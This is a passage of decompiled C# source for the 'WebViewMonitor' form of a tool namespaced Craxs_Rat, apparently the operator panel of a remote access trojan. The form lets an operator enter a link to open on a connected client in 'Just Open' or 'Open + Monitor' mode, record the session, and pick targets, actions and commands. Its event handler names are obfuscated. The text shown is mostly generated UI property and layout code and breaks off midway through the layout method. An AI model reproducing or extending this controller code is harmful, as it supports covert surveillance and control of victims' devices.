using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Craxs_Rat.My.Resources;
using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class WebViewMonitor : Form
{
	private IContainer components;

	[AccessedThroughProperty("TargetLink")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUITextBox _TargetLink;

	[AccessedThroughProperty("openbtn")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButtonIcon _openbtn;

	[AccessedThroughProperty("vsbar")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIScrollBar _vsbar;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("selecthtmlbtn")]
	[CompilerGenerated]
	private DrakeUIButtonIcon _selecthtmlbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BWloader")]
	private BackgroundWorker _BWloader;

	[AccessedThroughProperty("timeloader")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Timer _timeloader;

	[AccessedThroughProperty("commndbtn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIButtonIcon _commndbtn;

	[AccessedThroughProperty("refbtn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIButtonIcon _refbtn;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("namescombo")]
	[CompilerGenerated]
	private DrakeUIComboBox _namescombo;

	[AccessedThroughProperty("cpybtn")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButtonIcon _cpybtn;

	[AccessedThroughProperty("savbtn")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButtonIcon _savbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("clrbtn")]
	private DrakeUIButtonIcon _clrbtn;

	public Client Classclient;

	public string Title;

	public object firstclick;

	public Dictionary<string, string> MapData;

	private int y;

	internal virtual DrakeUITextBox TargetLink
	{
		[CompilerGenerated]
		get
		{
			return _TargetLink;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = DrakeUITextBox1_MouseDown;
			DrakeUITextBox drakeUITextBox = _TargetLink;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.MouseDown -= value2;
			}
			_TargetLink = value;
			drakeUITextBox = _TargetLink;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.MouseDown += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon openbtn
	{
		[CompilerGenerated]
		get
		{
			return _openbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatsnhsdzx;
			DrakeUIButtonIcon drakeUIButtonIcon = _openbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_openbtn = value;
			drakeUIButtonIcon = _openbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeUIComboBox1")]
	internal virtual DrakeUIComboBox DrakeUIComboBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Mytitle")]
	internal virtual Label Mytitle
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("statustext")]
	public virtual Label statustext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIScrollBar vsbar
	{
		[CompilerGenerated]
		get
		{
			return _vsbar;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Vsbar_ValueChanged;
			DrakeUIScrollBar drakeUIScrollBar = _vsbar;
			if (drakeUIScrollBar != null)
			{
				drakeUIScrollBar.ValueChanged -= value2;
			}
			_vsbar = value;
			drakeUIScrollBar = _vsbar;
			if (drakeUIScrollBar != null)
			{
				drakeUIScrollBar.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("tabcontrols")]
	internal virtual DrakeUITabControl tabcontrols
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage1")]
	internal virtual TabPage TabPage1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage2")]
	internal virtual TabPage TabPage2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("resulttext")]
	internal virtual Label resulttext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel4")]
	internal virtual Panel Panel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon selecthtmlbtn
	{
		[CompilerGenerated]
		get
		{
			return _selecthtmlbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwashgys;
			DrakeUIButtonIcon drakeUIButtonIcon = _selecthtmlbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_selecthtmlbtn = value;
			drakeUIButtonIcon = _selecthtmlbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual BackgroundWorker BWloader
	{
		[CompilerGenerated]
		get
		{
			return _BWloader;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = BWloader_DoWork;
			BackgroundWorker backgroundWorker = _BWloader;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_BWloader = value;
			backgroundWorker = _BWloader;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	internal virtual Timer timeloader
	{
		[CompilerGenerated]
		get
		{
			return _timeloader;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Timeloader_Tick;
			Timer timer = _timeloader;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_timeloader = value;
			timer = _timeloader;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("SaveCheck")]
	internal virtual DrakeUICheckBox SaveCheck
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("vewimage")]
	internal virtual PictureBox vewimage
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel5")]
	internal virtual Panel Panel5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("clinameinfo")]
	internal virtual Label clinameinfo
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ClientPic")]
	internal virtual PictureBox ClientPic
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel7")]
	internal virtual Panel Panel7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel6")]
	internal virtual Panel Panel6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage3")]
	internal virtual TabPage TabPage3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("linkspanel")]
	internal virtual DrakeUITitlePanel linkspanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("datapanel")]
	internal virtual DrakeUITitlePanel datapanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel8")]
	internal virtual Panel Panel8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUIButtonIcon1")]
	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUIButtonIcon2")]
	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUITextBox1")]
	internal virtual DrakeUITextBox DrakeUITextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUITextBox3")]
	internal virtual DrakeUITextBox DrakeUITextBox3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUITextBox2")]
	internal virtual DrakeUITextBox DrakeUITextBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUIButtonIcon4")]
	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Actionslistcombo")]
	internal virtual DrakeUIComboBox Actionslistcombo
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TargetsListcombo")]
	internal virtual DrakeUIComboBox TargetsListcombo
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUIButtonIcon3")]
	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon commndbtn
	{
		[CompilerGenerated]
		get
		{
			return _commndbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon6_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _commndbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_commndbtn = value;
			drakeUIButtonIcon = _commndbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon refbtn
	{
		[CompilerGenerated]
		get
		{
			return _refbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon7_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _refbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_refbtn = value;
			drakeUIButtonIcon = _refbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("datalogtext")]
	internal virtual DrakeUIRichTextBox datalogtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("linktext")]
	internal virtual DrakeUITextBox linktext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("comandcombo")]
	internal virtual DrakeUIComboBox comandcombo
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIComboBox namescombo
	{
		[CompilerGenerated]
		get
		{
			return _namescombo;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Namescombo_SelectedIndexChanged;
			DrakeUIComboBox drakeUIComboBox = _namescombo;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged -= value2;
			}
			_namescombo = value;
			drakeUIComboBox = _namescombo;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("idtext")]
	internal virtual DrakeUITextBox idtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("nametext")]
	internal virtual DrakeUITextBox nametext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel9")]
	internal virtual Panel Panel9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon cpybtn
	{
		[CompilerGenerated]
		get
		{
			return _cpybtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon8_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _cpybtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_cpybtn = value;
			drakeUIButtonIcon = _cpybtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon savbtn
	{
		[CompilerGenerated]
		get
		{
			return _savbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon9_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _savbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_savbtn = value;
			drakeUIButtonIcon = _savbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon clrbtn
	{
		[CompilerGenerated]
		get
		{
			return _clrbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon5_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _clrbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_clrbtn = value;
			drakeUIButtonIcon = _clrbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.Panel7 = new System.Windows.Forms.Panel();
		this.SaveCheck = new DrakeUI.Framework.DrakeUICheckBox();
		this.Panel6 = new System.Windows.Forms.Panel();
		this.TargetLink = new DrakeUI.Framework.DrakeUITextBox();
		this.Mytitle = new System.Windows.Forms.Label();
		this.DrakeUIComboBox1 = new DrakeUI.Framework.DrakeUIComboBox();
		this.openbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.statustext = new System.Windows.Forms.Label();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.tabcontrols = new DrakeUI.Framework.DrakeUITabControl();
		this.TabPage1 = new System.Windows.Forms.TabPage();
		this.vewimage = new System.Windows.Forms.PictureBox();
		this.vsbar = new DrakeUI.Framework.DrakeUIScrollBar();
		this.TabPage2 = new System.Windows.Forms.TabPage();
		this.resulttext = new System.Windows.Forms.Label();
		this.Panel4 = new System.Windows.Forms.Panel();
		this.Label2 = new System.Windows.Forms.Label();
		this.selecthtmlbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.TabPage3 = new System.Windows.Forms.TabPage();
		this.datapanel = new DrakeUI.Framework.DrakeUITitlePanel();
		this.datalogtext = new DrakeUI.Framework.DrakeUIRichTextBox();
		this.linkspanel = new DrakeUI.Framework.DrakeUITitlePanel();
		this.Panel8 = new System.Windows.Forms.Panel();
		this.Label3 = new System.Windows.Forms.Label();
		this.comandcombo = new DrakeUI.Framework.DrakeUIComboBox();
		this.namescombo = new DrakeUI.Framework.DrakeUIComboBox();
		this.commndbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.idtext = new DrakeUI.Framework.DrakeUITextBox();
		this.nametext = new DrakeUI.Framework.DrakeUITextBox();
		this.linktext = new DrakeUI.Framework.DrakeUITextBox();
		this.Panel9 = new System.Windows.Forms.Panel();
		this.refbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.savbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.clrbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.cpybtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.BWloader = new System.ComponentModel.BackgroundWorker();
		this.timeloader = new System.Windows.Forms.Timer(this.components);
		this.Panel5 = new System.Windows.Forms.Panel();
		this.clinameinfo = new System.Windows.Forms.Label();
		this.ClientPic = new System.Windows.Forms.PictureBox();
		this.Panel1.SuspendLayout();
		this.Panel7.SuspendLayout();
		this.Panel6.SuspendLayout();
		this.Panel2.SuspendLayout();
		this.Panel3.SuspendLayout();
		this.tabcontrols.SuspendLayout();
		this.TabPage1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.vewimage).BeginInit();
		this.TabPage2.SuspendLayout();
		this.Panel4.SuspendLayout();
		this.TabPage3.SuspendLayout();
		this.datapanel.SuspendLayout();
		this.Panel8.SuspendLayout();
		this.Panel9.SuspendLayout();
		this.Panel5.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.ClientPic).BeginInit();
		base.SuspendLayout();
		this.Panel1.BackColor = System.Drawing.Color.Black;
		this.Panel1.Controls.Add(this.Panel7);
		this.Panel1.Controls.Add(this.Panel6);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel1.Location = new System.Drawing.Point(0, 0);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(928, 52);
		this.Panel1.TabIndex = 1;
		this.Panel7.Controls.Add(this.SaveCheck);
		this.Panel7.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel7.Location = new System.Drawing.Point(0, 0);
		this.Panel7.Margin = new System.Windows.Forms.Padding(2);
		this.Panel7.Name = "Panel7";
		this.Panel7.Size = new System.Drawing.Size(928, 24);
		this.Panel7.TabIndex = 24;
		this.SaveCheck.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.SaveCheck.Cursor = System.Windows.Forms.Cursors.Hand;
		this.SaveCheck.Dock = System.Windows.Forms.DockStyle.Right;
		this.SaveCheck.Font = new System.Drawing.Font("Calibri", 9f);
		this.SaveCheck.ForeColor = System.Drawing.Color.SkyBlue;
		this.SaveCheck.Location = new System.Drawing.Point(855, 0);
		this.SaveCheck.Margin = new System.Windows.Forms.Padding(2);
		this.SaveCheck.Name = "SaveCheck";
		this.SaveCheck.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.SaveCheck.RightToLeft = System.Windows.Forms.RightToLeft.Yes;
		this.SaveCheck.Size = new System.Drawing.Size(73, 24);
		this.SaveCheck.Style = DrakeUI.Framework.UIStyle.Custom;
		this.SaveCheck.StyleCustomMode = true;
		this.SaveCheck.TabIndex = 22;
		this.SaveCheck.Text = "Record";
		this.SaveCheck.TextAlign = System.Drawing.ContentAlignment.TopCenter;
		this.Panel6.Controls.Add(this.TargetLink);
		this.Panel6.Controls.Add(this.Mytitle);
		this.Panel6.Controls.Add(this.DrakeUIComboBox1);
		this.Panel6.Controls.Add(this.openbtn);
		this.Panel6.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel6.Location = new System.Drawing.Point(0, 24);
		this.Panel6.Margin = new System.Windows.Forms.Padding(2);
		this.Panel6.Name = "Panel6";
		this.Panel6.Size = new System.Drawing.Size(928, 28);
		this.Panel6.TabIndex = 23;
		this.TargetLink.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.TargetLink.Dock = System.Windows.Forms.DockStyle.Fill;
		this.TargetLink.FillColor = System.Drawing.Color.Black;
		this.TargetLink.Font = new System.Drawing.Font("Calibri", 12f);
		this.TargetLink.ForeColor = System.Drawing.Color.SkyBlue;
		this.TargetLink.Location = new System.Drawing.Point(126, 0);
		this.TargetLink.Margin = new System.Windows.Forms.Padding(4);
		this.TargetLink.Maximum = 2147483647.0;
		this.TargetLink.Minimum = -2147483648.0;
		this.TargetLink.Name = "TargetLink";
		this.TargetLink.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.TargetLink.Radius = 15;
		this.TargetLink.RectColor = System.Drawing.Color.SkyBlue;
		this.TargetLink.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.TargetLink.Size = new System.Drawing.Size(588, 27);
		this.TargetLink.Style = DrakeUI.Framework.UIStyle.Custom;
		this.TargetLink.TabIndex = 19;
		this.TargetLink.Watermark = "Enter Link";
		this.TargetLink.WordWarp = false;
		this.Mytitle.Dock = System.Windows.Forms.DockStyle.Left;
		this.Mytitle.Font = new System.Drawing.Font("Calibri", 14f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.Mytitle.ForeColor = System.Drawing.Color.SkyBlue;
		this.Mytitle.Location = new System.Drawing.Point(0, 0);
		this.Mytitle.Name = "Mytitle";
		this.Mytitle.Size = new System.Drawing.Size(126, 28);
		this.Mytitle.TabIndex = 20;
		this.Mytitle.Text = "Website Link";
		this.DrakeUIComboBox1.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUIComboBox1.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.DrakeUIComboBox1.FillColor = System.Drawing.Color.Black;
		this.DrakeUIComboBox1.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIComboBox1.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIComboBox1.Items.AddRange(new object[2] { "Just Open", "Open + Monitor" });
		this.DrakeUIComboBox1.Location = new System.Drawing.Point(714, 0);
		this.DrakeUIComboBox1.Margin = new System.Windows.Forms.Padding(4);
		this.DrakeUIComboBox1.MinimumSize = new System.Drawing.Size(63, 0);
		this.DrakeUIComboBox1.Name = "DrakeUIComboBox1";
		this.DrakeUIComboBox1.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.DrakeUIComboBox1.Radius = 15;
		this.DrakeUIComboBox1.RectColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIComboBox1.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIComboBox1.Size = new System.Drawing.Size(115, 27);
		this.DrakeUIComboBox1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIComboBox1.TabIndex = 21;
		this.DrakeUIComboBox1.Text = "Just Open";
		this.DrakeUIComboBox1.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.openbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.openbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.openbtn.FillColor = System.Drawing.Color.Black;
		this.openbtn.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.openbtn.FillPressColor = System.Drawing.Color.Black;
		this.openbtn.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.openbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.openbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.openbtn.ForePressColor = System.Drawing.Color.SkyBlue;
		this.openbtn.Location = new System.Drawing.Point(829, 0);
		this.openbtn.Name = "openbtn";
		this.openbtn.Radius = 25;
		this.openbtn.RectColor = System.Drawing.Color.SkyBlue;
		this.openbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.openbtn.RectHoverColor = System.Drawing.Color.White;
		this.openbtn.RectPressColor = System.Drawing.Color.White;
		this.openbtn.RectSelectedColor = System.Drawing.Color.White;
		this.openbtn.Size = new System.Drawing.Size(99, 28);
		this.openbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.openbtn.Symbol = 57571;
		this.openbtn.TabIndex = 18;
		this.openbtn.Text = "Open";
		this.Panel2.BackColor = System.Drawing.Color.Black;
		this.Panel2.Controls.Add(this.statustext);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel2.Location = new System.Drawing.Point(0, 533);
		this.Panel2.Name = "Panel2";
		this.Panel2.Size = new System.Drawing.Size(928, 16);
		this.Panel2.TabIndex = 2;
		this.statustext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.statustext.Font = new System.Drawing.Font("Calibri", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.statustext.ForeColor = System.Drawing.Color.SkyBlue;
		this.statustext.Location = new System.Drawing.Point(0, 0);
		this.statustext.Name = "statustext";
		this.statustext.Size = new System.Drawing.Size(928, 16);
		this.statustext.TabIndex = 21;
		this.statustext.Text = "...";
		this.Panel3.Controls.Add(this.tabcontrols);
		this.Panel3.Controls.Add(this.Panel2);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel3.Location = new System.Drawing.Point(0, 29);
		this.Panel3.Name = "Panel3";
		this.Panel3.Size = new System.Drawing.Size(928, 549);
		this.Panel3.TabIndex = 3;
		this.tabcontrols.Controls.Add(this.TabPage1);
		this.tabcontrols.Controls.Add(this.TabPage2);
		this.tabcontrols.Controls.Add(this.TabPage3);
		this.tabcontrols.Dock = System.Windows.Forms.DockStyle.Fill;
		this.tabcontrols.DrawMode = System.Windows.Forms.TabDrawMode.OwnerDrawFixed;
		this.tabcontrols.FillColor = System.Drawing.Color.Black;
		this.tabcontrols.Font = new System.Drawing.Font("Calibri", 12f);
		this.tabcontrols.ItemSize = new System.Drawing.Size(380, 40);
		this.tabcontrols.Location = new System.Drawing.Point(0, 0);
		this.tabcontrols.MenuStyle = DrakeUI.Framework.UIMenuStyle.Custom;
		this.tabcontrols.Multiline = true;
		this.tabcontrols.Name = "tabcontrols";
		this.tabcontrols.SelectedIndex = 0;
		this.tabcontrols.Size = new System.Drawing.Size(928, 533);
		this.tabcontrols.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
		this.tabcontrols.Style = DrakeUI.Framework.UIStyle.Custom;
		this.tabcontrols.TabBackColor = System.Drawing.Color.FromArgb(30, 30, 30);
		this.tabcontrols.TabIndex = 2;
		this.tabcontrols.TabSelectedColor = System.Drawing.Color.SkyBlue;
		this.tabcontrols.TabSelectedForeColor = System.Drawing.Color.Black;
		this.tabcontrols.TabSelectedHighColor = System.Drawing.Color.Black;
		this.tabcontrols.TabUnSelectedForeColor = System.Drawing.Color.FromArgb(240, 240, 240);
		this.TabPage1.BackColor = System.Drawing.Color.Black;
		this.TabPage1.Controls.Add(this.vewimage);
		this.TabPage1.Controls.Add(this.vsbar);
		this.TabPage1.Controls.Add(this.Panel1);
		this.TabPage1.Location = new System.Drawing.Point(0, 80);
		this.TabPage1.Name = "TabPage1";
		this.TabPage1.Size = new System.Drawing.Size(928, 453);
		this.TabPage1.TabIndex = 0;
		this.TabPage1.Text = "General";
		this.vewimage.BackColor = System.Drawing.Color.FromArgb(10, 10, 10);
		this.vewimage.Dock = System.Windows.Forms.DockStyle.Fill;
		this.vewimage.Location = new System.Drawing.Point(0, 52);
		this.vewimage.Margin = new System.Windows.Forms.Padding(2);
		this.vewimage.Name = "vewimage";
		this.vewimage.Size = new System.Drawing.Size(909, 401);
		this.vewimage.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.vewimage.TabIndex = 3;
		this.vewimage.TabStop = false;
		this.vsbar.Dock = System.Windows.Forms.DockStyle.Right;
		this.vsbar.FillColor = System.Drawing.Color.Black;
		this.vsbar.Font = new System.Drawing.Font("Calibri", 12f);
		this.vsbar.ForeColor = System.Drawing.Color.SkyBlue;
		this.vsbar.Location = new System.Drawing.Point(909, 52);
		this.vsbar.Name = "vsbar";
		this.vsbar.PressColor = System.Drawing.Color.SkyBlue;
		this.vsbar.Size = new System.Drawing.Size(19, 401);
		this.vsbar.Style = DrakeUI.Framework.UIStyle.Custom;
		this.vsbar.TabIndex = 1;
		this.vsbar.Text = "DrakeUIScrollBar1";
		this.TabPage2.BackColor = System.Drawing.Color.Black;
		this.TabPage2.Controls.Add(this.resulttext);
